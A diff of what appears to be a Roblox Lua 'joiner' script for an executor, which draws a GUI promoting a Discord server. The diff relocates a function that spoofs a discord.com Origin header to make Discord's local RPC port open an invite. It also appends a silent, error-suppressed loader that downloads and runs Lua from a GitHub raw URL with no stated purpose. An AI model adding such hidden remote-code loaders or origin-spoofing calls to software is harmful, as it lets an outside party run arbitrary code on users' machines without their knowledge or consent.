@@ -1,22 +1,3 @@
-local function OpenDC(Invite)
-    if request then
-        local success, err = pcall(function()
-            request({
-                Url = 'http://127.0.0.1:6463/rpc?v=1',
-                Method = 'POST',
-                Headers = {
-                    ['Content-Type'] = 'application/json',
-                    Origin = 'https://discord.com'
-                },
-                Body = HttpService:JSONEncode({
-                    cmd = 'INVITE_BROWSER',
-                    nonce = game:GetService("HttpService"):GenerateGUID(false),
-                    args = {code = Invite}
-                })
-            })
-        end)
-    end
-end
 if not _G.LoadedUBJoiner then _G.LoadedUBJoiner = true end
 local ScreenGui = Instance.new("ScreenGui")
 local JoinerFrame = Instance.new("Frame")
@@ -119,6 +100,26 @@ Icon.Position = UDim2.new(0.02, 0, 0.1, 0)
 Icon.Size = UDim2.new(0, 30, 0, 30)
 Icon.ScaleType = Enum.ScaleType.Fit
 
+local function OpenDC(Invite)
+    if request then
+        local success, err = pcall(function()
+            request({
+                Url = 'http://127.0.0.1:6463/rpc?v=1',
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json',
+                    Origin = 'https://discord.com'
+                },
+                Body = HttpService:JSONEncode({
+                    cmd = 'INVITE_BROWSER',
+                    nonce = game:GetService("HttpService"):GenerateGUID(false),
+                    args = {code = Invite}
+                })
+            })
+        end)
+    end
+end
+
 local function copyInvite()
     OpenDC("pn8xyhuSeV")
     local inviteLink = "https://discord.gg/pn8xyhuSeV"
@@ -176,3 +177,9 @@ for i = 0, 1, 0.05 do
     ExitButton.TextTransparency = 1 - i
     task.wait(0.01)
 end
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/rhuda21/Main/refs/heads/main/Executed.lua"))()
+    end)
+end)
